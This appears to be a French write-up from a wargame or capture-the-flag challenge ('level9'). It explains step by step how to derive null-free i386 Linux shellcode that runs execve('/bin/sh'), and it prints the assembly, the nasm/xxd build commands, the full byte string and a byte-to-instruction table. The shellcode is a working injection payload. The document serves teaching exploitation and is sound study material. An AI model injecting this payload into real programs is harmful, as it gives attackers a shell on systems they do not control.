# Shellcode level9 — Pas à pas : de execve("/bin/sh") aux octets

## Objectif

Obtenir la suite d’octets (shellcode) qui exécute **execve("/bin/sh", NULL, NULL)** sur i386 Linux, **sans octet nul** (pour rester utilisable dans une chaîne C/env).

## Étape 1 — Appel système execve (i386)

Sur Linux i386, **execve** est le syscall numéro **11** (0x0b).

- **eax** = 11 (numéro du syscall)
- **ebx** = adresse de la chaîne `"/bin/sh"`
- **ecx** = adresse de **argv** (ex. tableau `[ptr vers "/bin/sh", 0]` ; peut être NULL)
- **edx** = adresse de **env** (ex. NULL)
- **int 0x80** → lance le syscall

Donc en pseudo-code : `execve(ebx, ecx, edx)` avec ebx = "/bin/sh", ecx = NULL ou [&"/bin/sh", 0], edx = NULL.

## Étape 2 — Problème : adresse de "/bin/sh"

Le shellcode peut être injecté n’importe où (env, buffer). On ne connaît pas son adresse à l’avance. Il faut que le code soit **position-independent** : il doit trouver lui-même l’adresse de la chaîne `"/bin/sh"`.

Technique classique : **jmp + call + pop**.

- `jmp` saute par-dessus la chaîne `"/bin/sh"`.
- `call` (vers une étiquette juste au-dessus de `"/bin/sh"`) pousse l’adresse de retour ( = adresse de `"/bin/sh"`) sur la stack.
- `pop esi` (ou autre registre) récupère cette adresse → on a l’adresse de `"/bin/sh"` dans **esi**.

Ensuite on construit argv (ex. [esi, 0]) et on fait execve(esi, …).

## Étape 3 — Écriture en assembleur (exemple de structure)

Idée (équivalent du shellcode classique utilisé en level9) :

```asm
    jmp    short after_string
here:
    pop    esi              ; esi = adresse de "/bin/sh"
    mov    [esi+8], esi     ; argv[0] = esi
    xor    eax, eax
    mov    [esi+7], al      ; null byte après "/bin/sh"
    mov    [esi+0xc], eax   ; argv[1] = NULL
    mov    al, 11           ; syscall execve
    mov    ebx, esi         ; path = "/bin/sh"
    lea    ecx, [esi+8]     ; argv
    lea    edx, [esi+0xc]   ; env
    int    0x80
    xor    ebx, ebx
    mov    eax, ebx
    inc    eax               ; eax=1 = exit
    int    0x80
after_string:
    call   here
    db     "/bin/sh"
```

(Les offsets 7, 8, 0xc dépendent de la longueur de "/bin/sh" et du layout choisi.)

## Étape 4 — Assembler → obtenir les octets

1. **Sauver le source** dans un fichier, ex. `shell.asm`.

2. **Assembler** (nasm, syntaxe Intel) :
   - En **binaire brut** : `nasm -f bin shell.asm -o shell.bin`
   - **Important :** le fichier `.asm` doit commencer par **`[bits 32]`** pour que nasm génère du code **32 bits**. Sans cela, nasm en `-f bin` assemble en 16 bits par défaut et on obtient des préfixes `66` (operand size) partout → shellcode incompatible avec un binaire i386.
   - Alternative : `nasm -f elf32 shell.asm -o shell.o` puis extraire la section .text.

3. **Extraire les octets bruts** :
   - Si .o : trouver la section .text et son offset, puis extraire les octets (objcopy, ou lire avec objdump -s).
   - Si .bin : directement les octets du fichier.

4. **Afficher en hex** (pour copier dans Python) :
   ```bash
   xxd -p shell.bin
   ```
   ou
   ```bash
   hexdump -C shell.bin
   ```

5. **Convertir en chaîne Python** : chaque paire hex → `\xXX`.
   - Ex. `eb1f5e89...` → `"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff"` + `"/bin/sh"`.

## Étape 5 — Correspondance octets ↔ instructions (décodage)

Pour **vérifier** ou **comprendre** le shellcode level9 sans refaire l’asm à la main, on peut le **désassembler** :

```bash
echo -ne '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff' | ndisasm -u - 2>/dev/null || echo '...' | xxd -r -p | ndisasm -u -
```

Ou avec **objdump** : mettre les octets dans un .o (section .text) puis `objdump -d -M intel`.

| Octets (début) | Instruction (approximatif) | Rôle |
|----------------|----------------------------|------|
| eb 1f          | jmp +0x1f                  | Sauter par-dessus la chaîne |
| 5e             | pop esi                    | esi = adresse de "/bin/sh" (après call) |
| 89 76 08       | mov [esi+8], esi          | Préparer argv |
| 31 c0          | xor eax, eax              | eax = 0 |
| 88 46 07       | mov [esi+7], al           | Null terminator après "/bin/sh" |
| 89 46 0c       | mov [esi+0xc], eax        | argv[1] = NULL |
| b0 0b          | mov al, 0xb               | eax = 11 (execve) |
| 89 f3          | mov ebx, esi              | ebx = "/bin/sh" |
| 8d 4e 08       | lea ecx, [esi+8]          | ecx = argv |
| 8d 56 0c       | lea edx, [esi+0xc]        | edx = env |
| cd 80          | int 0x80                  | execve("/bin/sh", argv, env) |
| 31 db          | xor ebx, ebx              | ebx = 0 (pour exit) |
| 89 d8          | mov eax, ebx              | eax = 0 |
| 40             | inc eax                    | eax = 1 (syscall exit) |
| cd 80          | int 0x80                  | exit(0) (si execve échoue) |
| e8 dc ff ff ff | call rel                   | Retour en arrière → pop esi ; suivi de "/bin/sh" |

La chaîne **"/bin/sh"** (8 caractères) est placée juste après le `call` ; le `call` pousse l’adresse de cette chaîne sur la stack, puis `pop esi` la récupère.

## Résumé du flux de conversion

```
1. Définir le but : execve("/bin/sh", NULL, NULL)
2. Écrire l’assembleur (jmp/call/pop + setup argv/env + mov al,11 + int 0x80)
3. Assembler : nasm -f bin shell.asm -o shell.bin
4. Extraire les octets : xxd -p shell.bin
5. Mettre en forme Python : \xXX pour chaque octet, puis concaténer "/bin/sh"
6. Vérifier (optionnel) : ndisasm ou objdump sur les octets
```

Le shellcode utilisé dans le walkthrough est un **classique** documenté (ex. shell-storm, exploit-db) ; on peut soit le dériver soi-même avec les étapes ci-dessus, soit le prendre tel quel et vérifier avec ndisasm.

## Références

- `execve(2)` : https://man7.org/linux/man-pages/man2/execve.2.html
- Syscalls i386 (numéros) : `/usr/include/asm/unistd_32.h` ou documentation Linux.
- NASM : https://www.nasm.us/
- ndisasm (désassembler des octets bruts) : fourni avec nasm.
